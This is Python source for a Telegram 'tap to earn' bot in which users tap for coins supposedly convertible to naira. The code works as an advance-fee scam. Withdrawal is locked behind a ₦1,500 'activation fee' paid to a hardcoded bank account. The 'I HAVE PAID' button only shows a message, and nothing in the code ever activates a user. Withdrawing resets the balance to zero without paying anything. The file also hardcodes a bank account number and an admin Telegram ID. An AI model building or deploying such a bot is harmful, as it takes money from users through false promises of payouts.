from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import json
import os
import asyncio
from datetime import datetime

TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = 8930135604
LOGO_URL = "https://files.catbox.moe/2e6zd1.jpg"
DATA_FILE = "coins.json"
BANK_DETAILS = "Account: 2530258732\nBank: Access Bank"

TAP_VALUE = 0.02
DAILY_LIMIT_COINS = 1000.00
DAILY_BONUS_COINS = 50.00
WITHDRAW_MIN = 5000.00
ACTIVATION_FEE_NAIRA = 1500
NAIRA_RATE = 200
ADMIN_FEE = 0.20  # 20% fee

def load_coins():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_coins(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_today():
    return datetime.now().strftime("%Y-%m-%d")

user_coins = load_coins()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    today = get_today()

    if user_id not in user_coins:
        user_coins[user_id] = {"coins": 0.0, "daily_coins": 0.0, "date": today, "last_bonus": "", "activated": False}

    if user_coins[user_id]["date"] != today:
        user_coins[user_id]["daily_coins"] = 0.0
        user_coins[user_id]["date"] = today

    save_coins(user_coins)

    coins = user_coins[user_id]["coins"]
    daily_coins = user_coins[user_id]["daily_coins"]
    activated = user_coins[user_id].get("activated", False)
    gross_naira = (coins / DAILY_LIMIT_COINS) * NAIRA_RATE
    net_naira = gross_naira * (1 - ADMIN_FEE)
    remaining = DAILY_LIMIT_COINS - daily_coins

    keyboard = [
        [InlineKeyboardButton("💰 TAP TO EARN +0.02", callback_data="tap")],
        [InlineKeyboardButton("🎁 DAILY BONUS +50", callback_data="daily")],
        [InlineKeyboardButton("👛 WALLET", callback_data="wallet")],
        [InlineKeyboardButton("👥 REFER", callback_data="refer")],
    ]
    
    if activated:
        keyboard.append([InlineKeyboardButton("💸 WITHDRAW", callback_data="withdraw")])
    else:
        keyboard.append([InlineKeyboardButton(f"🔒 ACTIVATE FOR ₦{ACTIVATION_FEE_NAIRA}", callback_data="activate")])
        
    if update.effective_user.id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin")])

    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=LOGO_URL,
        caption=f"*Welcome to TAP TO EARN!*\n\nYour Coins: {coins:.2f} 🪙\n≈ ₦{net_naira:.2f} after 20% fee\nToday Earned: {daily_coins:.2f}/{DAILY_LIMIT_COINS:.2f}\nRemaining: {remaining:.2f}\nStatus: {'✅ Activated' if activated else '❌ Not Activated'}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global user_coins
    query = update.callback_query
    user_id = str(query.from_user.id)
    today = get_today()
    await query.answer()

    if user_id not in user_coins:
        user_coins[user_id] = {"coins": 0.0, "daily_coins": 0.0, "date": today, "last_bonus": "", "activated": False}

    if user_coins[user_id]["date"] != today:
        user_coins[user_id]["daily_coins"] = 0.0
        user_coins[user_id]["date"] = today

    coins = user_coins[user_id]["coins"]

    if query.data == "tap":
        if user_coins[user_id]["daily_coins"] >= DAILY_LIMIT_COINS:
            await query.answer("⚠️ Daily limit reached! 1000 coins earned. Come back tomorrow 12am.", show_alert=True)
            return
        user_coins[user_id]["coins"] += TAP_VALUE
        user_coins[user_id]["daily_coins"] += TAP_VALUE
        save_coins(user_coins)
        await asyncio.sleep(0.3)
        await start(update, context)

    elif query.data == "daily":
        if user_coins[user_id].get("last_bonus", "") == today:
            await query.answer("❌ You already claimed today's bonus! Come back tomorrow 🎁", show_alert=True)
        else:
            if user_coins[user_id]["daily_coins"] + DAILY_BONUS_COINS > DAILY_LIMIT_COINS:
                await query.answer(f"⚠️ Can't claim! Would exceed daily limit", show_alert=True)
            else:
                user_coins[user_id]["coins"] += DAILY_BONUS_COINS
                user_coins[user_id]["daily_coins"] += DAILY_BONUS_COINS
                user_coins[user_id]["last_bonus"] = today
                save_coins(user_coins)
                await query.answer(f"🎁 Daily Bonus Claimed! +{DAILY_BONUS_COINS} coins", show_alert=True)
                await start(update, context)

    elif query.data == "activate":
        await query.edit_message_caption(
            caption=f"*🔒 ACCOUNT ACTIVATION*\n\nTo enable withdrawal, pay ₦{ACTIVATION_FEE_NAIRA} activation fee.\n\n`{BANK_DETAILS}`\n\nAfter payment, tap 'I HAVE PAID' below.\nAdmin will activate you within 24hrs.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ I HAVE PAID", callback_data="paid")],
                                               [InlineKeyboardButton("⬅️ BACK", callback_data="back")]]),
            parse_mode="Markdown"
        )
        
    elif query.data == "paid":
        await query.answer("📩 Payment proof received!\nAdmin will activate you within 24hrs.", show_alert=True)

    elif query.data == "withdraw":
        if not user_coins[user_id].get("activated", False):
            await query.answer(f"🔒 Activate first for ₦{ACTIVATION_FEE_NAIRA} to withdraw!", show_alert=True)
            return
            
        gross_naira = (coins / DAILY_LIMIT_COINS) * NAIRA_RATE
        fee = gross_naira * ADMIN_FEE
        net_naira = gross_naira - fee
        
        if coins < WITHDRAW_MIN:
            await query.answer(f"❌ Minimum is {WITHDRAW_MIN:.0f} coins ≈ ₦{(WITHDRAW_MIN/DAILY_LIMIT_COINS)*NAIRA_RATE:.0f}", show_alert=True)
        else:
            user_coins[user_id]["coins"] = 0.0
            user_coins[user_id]["daily_coins"] = 0.0
            save_coins(user_coins)
            await query.answer(f"💸 Withdrawal Request Sent!\nGross: ₦{gross_naira:.0f}\nFee 20%: -₦{fee:.0f}\nYou get: ₦{net_naira:.0f}\nBalance reset to 0.", show_alert=True)
            await start(update, context)

    elif query.data == "wallet":
        gross_naira = (coins / DAILY_LIMIT_COINS) * NAIRA_RATE
        fee = gross_naira * ADMIN_FEE
        net_naira = gross_naira - fee
        activated = user_coins[user_id].get("activated", False)
        await query.edit_message_caption(
            caption=f"*👛 YOUR WALLET*\n\nTotal Coins: {coins:.2f} 🪙\nGross: ₦{gross_naira:.2f}\nAfter 20% Fee: ₦{net_naira:.2f}\nStatus: {'✅ Activated' if activated else f'❌ Pay ₦{ACTIVATION_FEE_NAIRA} to activate'}\n\nRate: {DAILY_LIMIT_COINS:.0f} coins = ₦{NAIRA_RATE}\nMin Withdraw: {WITHDRAW_MIN:.0f} coins\nAdmin Fee: 20%",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="back")]]),
            parse_mode="Markdown"
        )

    elif query.data == "refer":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start=ref{user_id}"
        await query.edit_message_caption(
            caption=f"*👥 REFER FRIENDS*\n\nShare this link:\n`{ref_link}`\n\nComing Soon!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="back")]]),
            parse_mode="Markdown"
        )

    elif query.data == "admin" and query.from_user.id == ADMIN_ID:
        total_users = len(user_coins)
        total_coins = sum(u["coins"] for u in user_coins.values())
        activated_users = sum(1 for u in user_coins.values() if u.get("activated"))
        await query.edit_message_caption(
            caption=f"*👑 ADMIN PANEL*\n\nTotal Users: {total_users}\nActivated Users: {activated_users}\nTotal Coins: {total_coins:.2f} 🪙",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="back")]]),
            parse_mode="Markdown"
        )

    elif query.data == "back":
        await start(update, context)

app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button))
print("Bot is running...")
app.run_polling()